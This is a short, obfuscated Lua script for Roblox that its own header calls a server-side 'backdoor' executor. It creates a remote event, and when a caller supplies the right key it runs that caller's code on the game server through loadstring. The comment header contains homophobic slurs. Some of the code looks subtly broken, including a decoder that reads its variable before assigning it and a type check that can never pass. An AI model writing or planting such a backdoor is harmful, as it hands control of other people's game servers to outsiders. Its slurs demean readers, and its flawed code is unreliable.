--[[
    sane's SS Executor v1.0
    the real backdoor not that pussy shit you had before
    obfuscated to hell and back good luck reversing this faggots
]]--
local function g(v) return string.char(tonumber(string.sub(v,3),16)) end;local function o(v) local t,o,n='',v,string.len(o) while #t<n do local a,b=string.byte(o,string.len(t)+1,string.len(t)+2) t=t..string.char(bit32.bxor(a,b or 137)) end return t end;local s=o("\52\18\80\245\150\203\212\177\93\108\212\176\30\227\89\82\133\222\135\81\198\230\218\162\19\101\83\146\220\129\201\206\152\54\98\206\152\60\234\93\84\137\214\140\24\201\238\222\163\13\97\82\156\217\135\209\218\159\53\96\218\159\59\238\94\81\130\220\132\87")local r=Instance.new(o("\58\28\87\242\150\202\216\189\94\108\212\176\30\227"),game:GetService(o("\53\25\80\242\144\202\216\189\89\110\218\167\29\227")))r.Name=o("\56\25\94\242\148\202\216\177\30\227")local function e(p,k,c)if type(p)~='Instance'or not p:IsA(o("\57\29\94\254\146\203\218"))then return end;if k~=s then p:Kick(o("\52\29\95\252\140\202\203\212\181\94\108\212\176\30\227"))return end;local a,b=loadstring(c)if not a then return end;coroutine.wrap(pcall)(a)end;r.OnServerEvent:Connect(e)
